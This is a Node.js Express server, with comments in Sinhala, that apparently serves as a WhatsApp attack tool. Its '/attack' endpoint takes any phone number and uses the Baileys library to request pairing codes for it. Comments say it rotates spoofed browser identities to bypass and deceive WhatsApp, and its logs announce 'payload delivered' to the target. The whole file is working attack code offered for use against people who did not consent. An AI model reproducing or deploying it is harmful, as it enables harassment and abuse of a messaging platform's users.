const express = require('express');
const { default: makeWASocket, useMultiFileAuthState, delay } = require('@whiskeysockets/baileys');
const pino = require('pino');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 8000;

app.use(express.static('public'));

// විවිධ Browser Identity ලැයිස්තුවක් (Bypass කිරීමට)
const browsers = [
    ["Mac OS", "Chrome", "10.15.7"],
    ["Ubuntu", "Chrome", "20.0.04"],
    ["Windows", "Edge", "110.0.1587.41"],
    ["Linux", "Firefox", "109.0"],
    ["Desktop", "Safari", "17.0"]
];

app.get('/attack', async (req, res) => {
    const target = req.query.num;
    if (!target) return res.status(400).json({ success: false, error: "Target missing!" });

    // අහඹු ලෙස එක Browser එකක් තෝරාගැනීම
    const randomBrowser = browsers[Math.floor(Math.random() * browsers.length)];
    
    console.log(`[DEXTER-INJECTION] Targeting: ${target} using ${randomBrowser[0]}`);

    try {
        const { state, saveCreds } = await useMultiFileAuthState('dexter_session');
        
        const sock = makeWASocket({
            auth: state,
            logger: pino({ level: 'silent' }),
            browser: randomBrowser, // මෙතනදී තමයි වට්සැප් එක රවට්ටන්නේ
            printQRInTerminal: false,
            // සර්වර් එකේ කනෙක්ෂන් එක ඉක්මනින් Timeout වීම වැළැක්වීමට
            connectTimeoutMs: 60000,
            defaultQueryTimeoutMs: 0,
            keepAliveIntervalMs: 10000
        });

        // Creds update කිරීම (Session එක ස්ථාවරව තබා ගැනීමට)
        sock.ev.on('creds.update', saveCreds);

        // Pairing Code එක ඉල්ලීම
        const code = await sock.requestPairingCode(target.replace(/[^0-9]/g, ''));
        
        console.log(`[DEXTER-SUCCESS] Payload Delivered to ${target}`);
        
        res.json({ 
            success: true, 
            message: "Payload Delivered", 
            target: target,
            identity: randomBrowser[0] 
        });

    } catch (e) {
        console.log(`[DEXTER-ERROR] Injection Failed: ${e.message}`);
        
        // Error එක මොකක්ද කියලා හරියටම පෙන්වමු
        res.status(500).json({ 
            success: false, 
            error: e.message,
            tip: "Try again in a few seconds."
        });
    }
});

// Main Page ලෝඩ් කිරීම
app.get('/', (req, res) => {
    res.sendFile(path.join(process.cwd(), 'index.html'));
});

app.listen(PORT, () => {
    console.log(`
    -------------------------------------------
    🧬 DEXTER NEURAL SYSTEM V2.5 LIVE
    -------------------------------------------
    PORT: ${PORT}
    STATUS: INJECTION READY
    -------------------------------------------
    `);
});
